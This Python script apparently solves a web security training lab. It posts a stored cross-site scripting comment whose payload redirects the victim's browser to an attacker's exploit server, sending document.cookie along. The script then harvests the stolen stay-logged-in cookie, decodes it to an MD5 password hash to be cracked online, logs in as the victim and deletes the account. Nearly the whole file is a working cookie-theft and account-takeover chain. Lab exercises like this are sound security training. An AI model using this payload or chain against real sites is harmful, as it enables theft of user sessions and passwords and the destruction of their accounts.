import requests
import base64
import sys
import urllib3
import time
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def get_csrf_token(s, url, path):
    target_url = url + path
    r = s.get(target_url, headers=headers)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})
    return csrf.get('value', '') if csrf else '' # type: ignore

def post_comment(s, url, path, csrf_path, postId, comment, name, email, website):
    target_url = url + path
    payload = {
        'csrf': get_csrf_token(s, url, csrf_path),
        'postId': postId,
        'comment': comment,
        'name': name,
        'email': email,
        'website': website
    }
    r = s.post(target_url, data=payload, allow_redirects=False)

    if r.status_code == 302:
        print('[+] Success post a comment')
    else:
        print('[-] Failed to post a comment')
        sys.exit(-1)

def get_stay_logged_cookie(s, exploit_url, path):
    target_url = exploit_url + path
    r = s.get(target_url)
    print('Wait for vitim click injection page...')
    while 'stay-logged-in=' not in r.text:
        time.sleep(2)
        r = s.get(target_url)
    stay_cookie = r.text.split('stay-logged-in=')[-1].split(' HTTP')[0]
    return stay_cookie

def decode_cookie(stay_cookie):
    hash_pass = base64.b64decode(stay_cookie).decode('utf-8')[7:]
    print(f'Md5 hash password: {hash_pass}')
    print('Go to https://crackstation.net/ to decode the md5 popular password')
    password = input('Type password decoded here: ')
    return password

def login_acc(s, url, path, csrf_path, username, password):
    login_url = url + path
    payload = {
        "csrf": get_csrf_token(s, url, csrf_path),
        "username": username,
        "password": password
    }
    r = s.post(login_url, data=payload, allow_redirects=False)
    if r.status_code == 302:
        print(f'[+] Successful login {username} account')
    else:
        print(f'[-] Fail to login {username} account')
        sys.exit(-1)

def delete_acc(s, url, path, username, password):
    target_url = url + path
    payload = { 'password': password }
    r = s.post(target_url, data=payload, allow_redirects=False)
    
    if r.status_code == 302:
        print(f'[+] Successful delete {username} account')
    else:
        print(f'[-] Failed to delete {username} account')
        sys.exit(-1)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 3:
        print("(+) Usage: %s <url> <exploit_url>" % sys.argv[0])
        print("(+) Example: %s www.example.com www.exploit.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1].rstrip('/')
    exploit_url = sys.argv[2].rstrip('/')

    target_username = 'carlos'
    postId = 2
    comment = f"<script>document.location='{exploit_url}/log?c=' + document.cookie</script>"
    name = 'test'
    email = 'test@gmail.com'
    website = 'https://test.com'

    post_comment(s, url, '/post/comment', f'/post?postId={postId}', postId, comment, name, email, website)
    stay_cookie = get_stay_logged_cookie(s, exploit_url, '/log')
    password = decode_cookie(stay_cookie)
    login_acc(s, url, '/login', '/login', target_username, password)
    delete_acc(s, url, '/my-account/delete', target_username, password)

    check_solved_lab(s, url)

if __name__ == '__main__':
    main()